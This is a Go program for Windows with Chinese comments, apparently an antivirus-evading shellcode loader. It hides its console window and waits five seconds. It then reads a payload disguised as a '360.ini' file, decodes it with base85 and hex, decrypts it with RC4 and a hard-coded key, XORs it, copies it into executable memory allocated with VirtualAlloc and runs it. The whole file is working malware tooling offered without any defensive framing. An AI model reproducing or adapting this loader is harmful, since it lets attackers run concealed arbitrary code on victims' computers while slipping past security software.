package main

import (
	"crypto/rc4"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"
	"syscall"
	"time"
	"unsafe"

	"github.com/eknkc/basex"
	"golang.org/x/sys/windows"
)

const (
	memCommit            = 0x00001000
	memReserve           = 0x00002000
	pageExecute          = 0x10
	pageExecuteRead      = 0x20
	pageExecuteReadWrite = 0x40
	pageExecuteWrite     = 0x80
	memRelease           = 0x8000
)


func HConsole() int {
	getWin := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
	hwnd, _, _ := getWin.Call()
	if hwnd != 0 {
		showWindowAsync := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindowAsync")
		showWindowAsync.Call(hwnd, 0)
	}
	return 0
}

func main() {
	HConsole()
	time.Sleep(5 * time.Second)
	key := []byte("demaxiya")
	dir, err := os.Getwd()
	if err != nil {
		fmt.Println("无法获取当前目录：", err)
		return
	}

	filePath := dir + "/360.ini"
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		fmt.Println("无法读取文件：", err)
		return
	}

	// 将文件内容作为参数值返回给主体
	encodedMessage := string(data)

	// 解码 base85 编码的消息
	base85, _ := basex.NewEncoding("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~")
	hexCiphertext, _ := base85.Decode(encodedMessage)

	// 转为二进制
	rc4Message := make([]byte, hex.DecodedLen(len(hexCiphertext)))
	n, _ := hex.Decode(rc4Message, hexCiphertext)
	rc4Message = rc4Message[:n]

	// RC4 解密
	cipher, _ := rc4.NewCipher(key)
	xordMessage := make([]byte, len(rc4Message))
	cipher.XORKeyStream(xordMessage, rc4Message)

	// XOR 操作
	message := make([]byte, len(xordMessage))
	for i := 0; i < len(xordMessage); i++ {
		message[i] = xordMessage[i] ^ 0xff
	}

	// 获取 kernel32.dll 中的 VirtualAlloc 函数
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	VirtualAlloc, _ := kernel32.FindProc("VirtualAlloc")

	// 分配内存并写入 shellcode 内容
	allocSize := uintptr(len(message))
	mem, _, _ := VirtualAlloc.Call(uintptr(0), allocSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	/* if mem == 0 {
		panic("VirtualAlloc failed")
	} */
	buffer := (*[0x1_000_000]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
	copy(buffer, message)

	// 执行 shellcode
	syscall.Syscall(mem, 0, 0, 0, 0)
}
